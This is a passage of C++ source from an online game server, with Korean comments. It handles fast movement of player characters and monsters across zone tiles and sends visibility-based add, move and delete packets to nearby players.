			pGCABC->setObjectID(pVampire->getObjectID());
			pGCABC->setName(pVampire->getName());
			pGCABC->setX(x2);
			pGCABC->setY(y2);
			pGCAddXXX = pGCABC;	
		}
		else
		{
//			GCAddVampire* pGCAddVampire = new GCAddVampire(pVampire->getVampireInfo3());
//			pGCAddVampire->setEffectInfo(pVampire->getEffectInfo());
			GCAddVampire* pGCAddVampire = new GCAddVampire;
			makeGCAddVampire( pGCAddVampire, pVampire );

			pGCAddXXX = pGCAddVampire;
		}
	}
	else if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_OUSTERS) 
	{
		Ousters* pOusters = dynamic_cast<Ousters*>(pPC);
//		GCAddOusters* pGCAddOusters = new GCAddOusters(pOusters->getOustersInfo3());
//		pGCAddOusters->setEffectInfo(pOusters->getEffectInfo());
		GCAddOusters* pGCAddOusters = new GCAddOusters;
		makeGCAddOusters( pGCAddOusters, pOusters );

		pGCAddXXX = pGCAddOusters;
	} 

	//--------------------------------------------------------------------------------
	// GCDeleteObject 패킷을 만들어둔다.
	//--------------------------------------------------------------------------------
	GCDeleteObject gcDeleteObject;
	gcDeleteObject.setObjectID(pPC->getObjectID());


	// 총 시야의 범위를 구한다.
	ZoneCoord_t minX, maxX, minY, maxY;
	if (x1 < x2)
	{
		minX = max(0, x1 - maxViewportWidth);
		maxX = min(m_Width-1, x2 + maxViewportWidth);
	}
	else
	{
		minX = max(0, x2 - maxViewportWidth);
		maxX = min(m_Width-1, x1 + maxViewportWidth);
	}
	if (y1 < y2)
	{
		minY = max(0, y1 - maxViewportUpperHeight);
		maxY = min(m_Height-1, y2 + maxViewportLowerHeight);
	}
	else
	{
		minY = max(0, y2 - maxViewportUpperHeight);
		maxY = min(m_Height-1, y1 + maxViewportLowerHeight);
	}

//	Sight_t sight = pPC->getSight();
//	VisionInfo* pVisionInfo = g_pVisionInfoManager->getVisionInfo(sight, pPC->getDir());

	// ObservingEye 이펙트를 가져온다.
//	EffectObservingEye* pEffectObservingEye = NULL;
//	if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//	{
//		pEffectObservingEye = dynamic_cast<EffectObservingEye*>( pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//		//Assert( pEffectObservingEye != NULL );
//	}
//
	for (ZoneCoord_t ix = minX ; ix <= maxX ; ix++) 
	{
		for (ZoneCoord_t iy = minY ; iy <= maxY ; iy++) 
		{
			const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			forward_list<Object*>::const_iterator itr = objectList.begin();

			// visionInfo 때문에..
			// if - do~while()로 구조 변경 by sigi. 2002.5.8
			if (itr != objectList.end())
			{

				// 이전 좌표 P(x1,y1)에서 I(ix,iy)가 어떻게 보이는가?
//				VisionState prevVisionState = pVisionInfo->getVisionState(x1,y1,ix,iy);
				VisionState prevVisionState = VisionInfoManager::getVisionState(x1,y1,ix,iy);
				// 현재 좌표 Q(x2,y2)에서 I(ix,iy)가 어떻게 보이는가?
//				VisionState curVisionState = pVisionInfo->getVisionState(x2,y2,ix,iy);
				VisionState curVisionState = VisionInfoManager::getVisionState(x2,y2,ix,iy);

				do
				{
					Assert(*itr != NULL);

					//--------------------------------------------------------------------------------
					//
					// 각 객체의 OBJECT CLASS에 따라서 적합한 GCAddXXX 패킷을 만들어서
					// owner 에게 전송한다. 
					//
					// *NOTES*
					//
					// 가장 출현 확률이 높은 객체 CLASS 가 case 앞부분에 나와야 한다.
					//
					//--------------------------------------------------------------------------------
					switch ((*itr)->getObjectClass()) 
					{
						//--------------------------------------------------------------------------------
						// 타일 위에 크리처가 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_CREATURE :
							{
								Creature* pCreature = dynamic_cast<Creature*>(*itr);
								Assert(pCreature != NULL);

								// 자기 자신의 정보는 받을 필요가 없다.
								if (pCreature == pPC) continue;

								switch (pCreature->getCreatureClass()) 
								{
	
									case Creature::CREATURE_CLASS_MONSTER :
										{
											Monster* pMonster = dynamic_cast<Monster*>(pCreature);

											//--------------------------------------------------------------------------------
											//
											// 이전 좌표에서는 이 몬스터를 볼 수 없었으나, 도착 좌표에서 이 몬스터를 보게 될
											// 경우 GCAddMonster 패킷을 전송한다.
											//
											//--------------------------------------------------------------------------------
											if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
											{
												Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

												if (pAddMonsterPacket!=NULL)
												{
													pPlayer->sendPacket( pAddMonsterPacket );
													delete pAddMonsterPacket;
												}
											}

											//--------------------------------------------------------------------------------
											// PC를 몬스터의 잠재적인 적으로 지정해준다.
											//--------------------------------------------------------------------------------
											VisionState vs = pMonster->getVisionState(x2,y2);

											// Aggressive 몬스터에게만 적으로 등록시켜준다.
											if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
											{
												if (isPotentialEnemy(pMonster, pPC))
												{
													pMonster->addPotentialEnemy(pPC);
												}
											}

										}
										break;

									//--------------------------------------------------------------------------------
									//
									//--------------------------------------------------------------------------------
									case Creature::CREATURE_CLASS_SLAYER :
										{
											//--------------------------------------------------------------------------------
											// 이전 좌표에서는 보이지 않다가, 이번 좌표에서 새로 보이게 된 크리처만
											// GCAddXXX 를 받아온다. 계속 보일 경우에는 받아오지 않는다.
											//--------------------------------------------------------------------------------
											if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
											{
												// 보는 이가 스나이핑 상태라면 디텍트 되어 있어야 한다.
//												if (!pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)
//													|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) )
//													|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping( pCreature ) ) ) 
												if ( canSee( pPC, pCreature ) )
												{
													Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
//													GCAddSlayer gcAddSlayer(pSlayer->getSlayerInfo3()); 
//													gcAddSlayer.setEffectInfo(pSlayer->getEffectInfo());
													GCAddSlayer gcAddSlayer;
													makeGCAddSlayer( &gcAddSlayer, pSlayer );

													pPlayer->sendPacket(&gcAddSlayer);
												}
												
											}

											Assert(pCreature->getPlayer() != NULL);

											//--------------------------------------------------------------------------------
											//
											// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
											// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
											// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
											// 보내야만 한다.
											//
											// 요약하면,
											//
											// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
											// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
											//
											//--------------------------------------------------------------------------------
											VisionState prevVS = pCreature->getVisionState(x1,y1);
											VisionState currVS = pCreature->getVisionState(x2,y2);

											// 보이지 않는 영역에서, 경계 영역을 거치지 않고 바로
											// 시야 내부 영역으로 들어온다는 것은 불가능하다.

											// canSee 로 대체. by bezz 2003.05.29
											if ( canSee( pCreature, pPC ) )
											{
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pGCAddXXX);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												} 
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
										}
										break;

									case Creature::CREATURE_CLASS_VAMPIRE :
										{
											//--------------------------------------------------------------------------------
											// 이전 좌표에서는 보이지 않다가, 이번 좌표에서 새로 보이게 된 크리처만
											// GCAddXXX 를 받아온다. 이전에도 NEW_SIGHT 이고, 지금도 NEW_SIGHT 이면,
											// 새로 받아오지 않는다.
											//--------------------------------------------------------------------------------
											if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
											{
												if ( canSee( pPC, pCreature ) )
												{
													if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
													{
												//		if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )
	//														|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pCreature ) ) ) 
														{
															GCAddBurrowingCreature gcABC;
															gcABC.setObjectID(pCreature->getObjectID());
															gcABC.setName(pCreature->getName());
															gcABC.setX(ix);
															gcABC.setY(iy);
															pPlayer->sendPacket(&gcABC);
														}
													} 
													else 
													{
	//													if (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY))
	//													{
															Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
//															GCAddVampire gcAddVampire(pVampire->getVampireInfo3());
//															gcAddVampire.setEffectInfo(pVampire->getEffectInfo());
															GCAddVampire gcAddVampire;
															makeGCAddVampire( &gcAddVampire, pVampire );
															pPlayer->sendPacket(&gcAddVampire);
	//													}
														// pCreature는 invisibility상태..
	//													else if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) 
	//															|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
	//													{
	//														Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
	//														GCAddVampire gcAddVampire(pVampire->getVampireInfo3());
	//														gcAddVampire.setEffectInfo(pVampire->getEffectInfo());
	//														pPlayer->sendPacket(&gcAddVampire);
	//													}
													}
												}
											}

											Assert(pCreature->getPlayer() != NULL);

											//--------------------------------------------------------------------------------
											// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
											// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
											// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
											// 보내야만 한다.
											//
											// 요약하면,
											//
											// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
											// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
											//
											//--------------------------------------------------------------------------------
											VisionState prevVS = pCreature->getVisionState(x1,y1);
											VisionState currVS = pCreature->getVisionState(x2,y2);

											// 상대는 뱀파이어이므로 나의 darkness상태는 관계없다.
											// Hide도 관계없다.
											// *NOTE
											// 상대가 슬레이어라면 슬레이어가 스나이핑 상태인지를 체크 해야 한다.
//											if (!pPC->isSlayer() || !pPC->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) 
											if ( canSee( pCreature, pPC ) )
											{
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pGCAddXXX);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
										}
										break;

									case Creature::CREATURE_CLASS_OUSTERS :
										{
											//--------------------------------------------------------------------------------
											// 이전 좌표에서는 보이지 않다가, 이번 좌표에서 새로 보이게 된 크리처만
											// GCAddXXX 를 받아온다. 이전에도 NEW_SIGHT 이고, 지금도 NEW_SIGHT 이면,
											// 새로 받아오지 않는다.
											//--------------------------------------------------------------------------------
											if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT && canSee( pPC, pCreature)) 
											{
												Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
//												GCAddOusters gcAddOusters(pOusters->getOustersInfo3());
//												gcAddOusters.setEffectInfo(pOusters->getEffectInfo());
												GCAddOusters gcAddOusters;
												makeGCAddOusters( &gcAddOusters, pOusters );
												pPlayer->sendPacket(&gcAddOusters);
											}

											Assert(pCreature->getPlayer() != NULL);

											//--------------------------------------------------------------------------------
											// Q(x2,y2)가 이 크리처의 시야 사각형의 경계에 위치하면서, P(x1,y1)은 사각형의 외부, 
											// 즉 보이지 않는 경우에만 GCAddXXX 패킷을 전송한다. 이렇게 하지 않으면, PC
											// 크리처가 pCreature의 시야 경계에서 계속 움직이게 되면 계속 서버는 GCAddXXX 패킷을
											// 보내야만 한다.
											//
											// 요약하면,
											//
											// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
											// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
											//
											//--------------------------------------------------------------------------------
											VisionState prevVS = pCreature->getVisionState(x1,y1);
											VisionState currVS = pCreature->getVisionState(x2,y2);

											// 상대는 뱀파이어이므로 나의 darkness상태는 관계없다.
											// Hide도 관계없다.
											// *NOTE
											// 상대가 슬레이어라면 슬레이어가 스나이핑 상태인지를 체크 해야 한다.
											if ( canSee( pCreature, pPC ) )
											{
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pGCAddXXX);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream( &outputStream );
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
										}
										break;
							
									case Creature::CREATURE_CLASS_NPC :
										{
											NPC* pNPC = dynamic_cast<NPC*>(pCreature);

											//--------------------------------------------------------------------------------
											//
											// 이전 좌표에서는 이 몬스터를 볼 수 없었으나, 도착 좌표에서 이 몬스터를 보게 될
											// 경우 GCAddMonster 패킷을 전송한다.
											//
											//--------------------------------------------------------------------------------
											if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
											{
												GCAddNPC gcAddNPC;
												makeGCAddNPC(&gcAddNPC, pNPC);
												pPlayer->sendPacket(&gcAddNPC);
											}
										}
										break;

									default :
										throw Error("invalid creature class");
		
								}//switch (pCreature->getCreatureClass())
			
							}//case Object::OBJECT_CLASS_CREATURE :
		
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 아이템이 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_ITEM :
							{
								if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT)
								{
									Item* pItem = dynamic_cast<Item*>(*itr);

									if (pItem->getItemClass() == Item::ITEM_CLASS_CORPSE) 
									{
										switch (pItem->getItemType()) 
										{
											case SLAYER_CORPSE :
												{
													SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
													GCAddSlayerCorpse gcAddSlayerCorpse;
													makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
													pPlayer->sendPacket(&gcAddSlayerCorpse);
												}
												break;
											case VAMPIRE_CORPSE :
												{
													VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
													GCAddVampireCorpse gcAddVampireCorpse;
													makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
													pPlayer->sendPacket(&gcAddVampireCorpse);
												}
												break;
											case OUSTERS_CORPSE :
												{
													OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
													GCAddOustersCorpse gcAddOustersCorpse;
													makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
													pPlayer->sendPacket(&gcAddOustersCorpse);
												}
												break;
											case NPC_CORPSE :
												{
													throw UnsupportedError(__PRETTY_FUNCTION__);
												}
												break;
											case MONSTER_CORPSE :
												{
													MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
													GCAddMonsterCorpse gcAddMonsterCorpse;
													makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
													pPlayer->sendPacket(&gcAddMonsterCorpse);

													sendRelicEffect( pMonsterCorpse, pPlayer );
												}
												break;
										}//switch
									}
									else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE
											&& pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
									{	
										if (	pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
										{
											GCAddInstalledMineToZone gcAddMine;
											gcAddMine.setObjectID(pItem->getObjectID());
											gcAddMine.setX(ix);
											gcAddMine.setY(iy);
											gcAddMine.setItemClass(pItem->getItemClass());
											gcAddMine.setItemType(pItem->getItemType());
											gcAddMine.setOptionType(pItem->getOptionTypeList());
											gcAddMine.setDurability(pItem->getDurability());
											pPlayer->sendPacket(&gcAddMine);
										}
									} 
									else 
									{
										GCAddNewItemToZone gcAddNewItemToZone;
										makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
										pPlayer->sendPacket(&gcAddNewItemToZone);
									}
								}
							}
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 이펙트가 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_EFFECT :
							{
								Effect* pEffect = dynamic_cast<Effect*>(*itr);
								
								if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
								{
									if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
									{
										EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
										ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

										GCAddVampirePortal gcAddVampirePortal;
										gcAddVampirePortal.setObjectID(pEffect->getObjectID());
										gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
										gcAddVampirePortal.setX(ix);
										gcAddVampirePortal.setY(iy);
										gcAddVampirePortal.setTargetZoneID(zonecoord.id);
										gcAddVampirePortal.setTargetX(zonecoord.x);
										gcAddVampirePortal.setTargetY(zonecoord.y);
										gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
										gcAddVampirePortal.setCreateFlag(0);

										pPlayer->sendPacket(&gcAddVampirePortal);
									}
									// by sigi. 2002.6.10
									else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
									{
										EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

										ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
										ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
										
										// sanctuary는 중심좌표인 경우만 packet을 보낸다.
										if (centerX==ix && centerY==iy)
										{
											GCAddEffectToTile gcAddEffectToTile;

											gcAddEffectToTile.setObjectID(pEffect->getObjectID());
											gcAddEffectToTile.setXY(ix, iy); 
											gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
											gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

											pPlayer->sendPacket(&gcAddEffectToTile);
										}
									}
									// Broadcasting Effect 체크 추가 by Sequoia 2003.3.31
									else if (pEffect->isBroadcastingEffect())
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());
			
										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
							}
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 장애물이 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_OBSTACLE :
							{
								// darkness
							}
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 포탈이 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_PORTAL :
							{
								// darkness
							}
							break;

						default :
							throw Error("invalid object class");

					}//switch ((*itr)->getObjectClass())
				} while ( ++itr != objectList.end() );	// do ~ while
			}//if
		}//for
	}//for

	SAFE_DELETE(pGCAddXXX);

	return true;
	
	__END_DEBUG 
	__END_CATCH
}


//////////////////////////////////////////////////////////////////////////////
// P(x1,y1)에서 Q(x2,y2)로 빠른 이동한 크리처가 주변 영역에 존재하는 PC들에게 
// 브로드캐스트하는 메쏘드이다.
// for Skill FlashSliding, ShadowWalk
//////////////////////////////////////////////////////////////////////////////
bool Zone::moveFastMonster(Monster* pMonster, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, SkillType_t skillType)
{
	__BEGIN_TRY 
	__BEGIN_DEBUG

	if (
/*		pMonster->isFlag(Effect::EFFECT_CLASS_PARALYZE) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_HIDE) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_CAUSE_CRITICAL_WOUNDS) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_SLEEP) 
		|| pMonster->isFlag(Effect::EFFECT_CLASS_ARMAGEDDON) */
		!isAbleToMove( pMonster )
	) {
		// do nothing
		return false;
	} 

	ZoneLevel_t ZoneLevel = getZoneLevel(x2, y2);

	// 안전 지대에 못 들어간다.
	if ((ZoneLevel & SLAYER_SAFE_ZONE)
		|| (ZoneLevel & VAMPIRE_SAFE_ZONE)
		|| (ZoneLevel & COMPLETE_SAFE_ZONE))
	{
		return false;
	}

	// 적당한 종착지점을 찾는다.
	// 전면부에서 적당한 지점..4개 검색
	Dir_t dir = calcDirection(x1, y1, x2, y2);

	// g_FastMoveSearchX, Y로 찾으면 된다. by sigi. 2002.5.8
	int* searchX = g_FastMoveSearchX[dir];
	int* searchY = g_FastMoveSearchY[dir];

	// 빈 타일인지 확인.
	int i=0;
	for(i = 0; i< 4; i++)
	{
		int targetX = x2 + searchX[i], targetY = y2 + searchY[i];
		if (targetX >= 0 && targetX < m_Width 
			&& targetY >= 0 && targetY < m_Height 
			&& !m_pTiles[targetX][targetY].isBlocked(pMonster->getMoveMode()) 
			&& !m_pTiles[targetX][targetY].hasPortal())
		{
			x2 = targetX;
			y2 = targetY;
			break;
		}
	}
	if (i == 4) 
	{
		return false;	// 빈타일을 못찾았다!
	}
	
	// 일단 패킷을 만들어두고 밑에서 보낸다.
	GCFastMove gcFastMove;
	gcFastMove.setObjectID(pMonster->getObjectID());
	gcFastMove.setXY(x1, y1, x2, y2);
	gcFastMove.setSkillType( skillType );

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
#endif
	gcFastMove.writeHeaderNBody( outputStream );

	// 몬스터한테는 보낼 필요가 없다.
	//pPlayer->sendPacket(&gcFastMove);
	
	//////////////////////////////////////////////////////////////
	// move의 종류....
	// 이에따라 GCDelete나 Add등을 보내줘야 할 수 도 있다.
	
	// Monster 좌표 변경.
	pMonster->setXYDir(x2, y2, dir);
	// 이전 타일에서 크리처를 삭제한다.

	try {
		m_pTiles[x1][y1].deleteCreature(pMonster->getObjectID());	
	} catch (Error& e) {
		filelog("assertTile.txt", "moveFastMonster : %s", e.toString().c_str());
		throw;
	}

	// 새 타일에 크리처를 추가한다.
	m_pTiles[x2][y2].addCreature(pMonster);

	try {
		checkMine(this, pMonster, x2, y2);
		checkTrap(this, pMonster);
	} catch ( Throwable & t ) {
		filelog("CheckMineBug.txt", "%s : %s", "moveFastMonster", t.toString().c_str());
	}


	//--------------------------------------------------------------------------------
	// GCAddSlayer/GCAddVampire 패킷을 만들어둔다.
	// 현재의 정책에 의하면, GCAdd 패킷은 현재의 좌표를 바탕으로 한다.
	//--------------------------------------------------------------------------------
	Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, NULL );

	if (pAddMonsterPacket!=NULL)
	{
		//--------------------------------------------------------------------------------
		// GCDeleteObject 패킷을 만들어둔다.
		//--------------------------------------------------------------------------------
		GCDeleteObject gcDeleteObject;
		gcDeleteObject.setObjectID(pMonster->getObjectID());


		// 총 시야의 범위를 구한다.
		ZoneCoord_t minX, maxX, minY, maxY;
		if (x1 < x2)
		{
			minX = max(0, x1 - maxViewportWidth);
			maxX = min(m_Width-1, x2 + maxViewportWidth);
		}
		else
		{
			minX = max(0, x2 - maxViewportWidth);
			maxX = min(m_Width-1, x1 + maxViewportWidth);
		}
		if (y1 < y2)
		{
			minY = max(0, y1 - maxViewportUpperHeight);
			maxY = min(m_Height-1, y2 + maxViewportLowerHeight);
		}
		else
		{
			minY = max(0, y2 - maxViewportUpperHeight);
			maxY = min(m_Height-1, y1 + maxViewportLowerHeight);
		}

		//Sight_t sight = pMonster->getSight();

		//VisionInfo* pVisionInfo = g_pVisionInfoManager->getVisionInfo(sight, pMonster->getDir());

		for (ZoneCoord_t ix = minX ; ix <= maxX ; ix++) 
		{
			for (ZoneCoord_t iy = minY ; iy <= maxY ; iy++) 
			{
				const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

				forward_list<Object*>::const_iterator itr = objectList.begin();

				// visionInfo 때문에..
				// if - do~while()로 구조 변경 by sigi. 2002.5.8
				if (itr != objectList.end())
				{

					// 이전 좌표 P(x1,y1)에서 I(ix,iy)가 어떻게 보이는가?
					//VisionState prevVisionState = pVisionInfo->getVisionState(x1,y1,ix,iy);
					// 현재 좌표 Q(x2,y2)에서 I(ix,iy)가 어떻게 보이는가?
					//VisionState curVisionState = pVisionInfo->getVisionState(x2,y2,ix,iy);

					do
					{
						Assert(*itr != NULL);

						//--------------------------------------------------------------------------------
						//
						// 각 객체의 OBJECT CLASS에 따라서 적합한 GCAddXXX 패킷을 만들어서
						// owner 에게 전송한다. 
						//
						// *NOTES*
						//
						// 가장 출현 확률이 높은 객체 CLASS 가 case 앞부분에 나와야 한다.
						//
						//--------------------------------------------------------------------------------
						switch ((*itr)->getObjectClass()) 
						{
							//--------------------------------------------------------------------------------
							// 타일 위에 크리처가 있을 경우
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_CREATURE :
								{
									Creature* pCreature = dynamic_cast<Creature*>(*itr);
									Assert(pCreature != NULL);

									// 자기 자신의 정보는 받을 필요가 없다.
									if (pCreature == pMonster) continue;

									switch (pCreature->getCreatureClass()) 
									{
		
										case Creature::CREATURE_CLASS_MONSTER :
											{
												Monster* pOtherMonster = dynamic_cast<Monster*>(pCreature);

												//--------------------------------------------------------------------------------
												// PC를 몬스터의 잠재적인 적으로 지정해준다.
												//--------------------------------------------------------------------------------
												//VisionState vs = pMonster->getVisionState(x2,y2);

												// Aggressive 몬스터에게만 적으로 등록시켜준다.
												//if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
												{
													if (isPotentialEnemy(pOtherMonster, pMonster))
													{
														pMonster->addPotentialEnemy(pOtherMonster);
														pOtherMonster->addPotentialEnemy(pMonster);
													}
												}
											}
											break;

										//--------------------------------------------------------------------------------
										//
										//--------------------------------------------------------------------------------
										case Creature::CREATURE_CLASS_SLAYER :
											{
												Assert(pCreature->getPlayer() != NULL);

												VisionState prevVS = pCreature->getVisionState(x1,y1);
												VisionState currVS = pCreature->getVisionState(x2,y2);

												// Creature 가 ObservingEye 이펙트를 가지고 있다면 가져온다.
//												EffectObservingEye* pEffectObservingEye = NULL;
//												if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//												{
//													pEffectObservingEye = dynamic_cast<EffectObservingEye*>( pCreature->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//													//Assert( pEffectObservingEye != NULL );
//												}

												// 상대에게 PC의 등장을 알리는 패킷.
//												if ((!pMonster->isFlag(Effect::EFFECT_CLASS_HIDE) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) ) //|| ( pEffectRevealerCreature != NULL && pEffectRevealerCreature->canSeeHide( pPC ) ) ) 
//													&& (!pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pMonster ) ) ) 
//													&& (!pMonster->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) )) //|| ( pEffectRevealerCreature != NULL && pEffectRevealerCreature->canSeeSniping( pPC) ) ) )
												if ( canSee( pCreature, pMonster ) )
												{
													if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
													{
														pCreature->getPlayer()->sendPacket(pAddMonsterPacket);
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													} 
													else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
													{
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													}
													else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
													{
														pCreature->getPlayer()->sendPacket(&gcDeleteObject);
													}
												}
											}
											break;

										case Creature::CREATURE_CLASS_VAMPIRE :
											{
												Assert(pCreature->getPlayer() != NULL);

												//--------------------------------------------------------------------------------
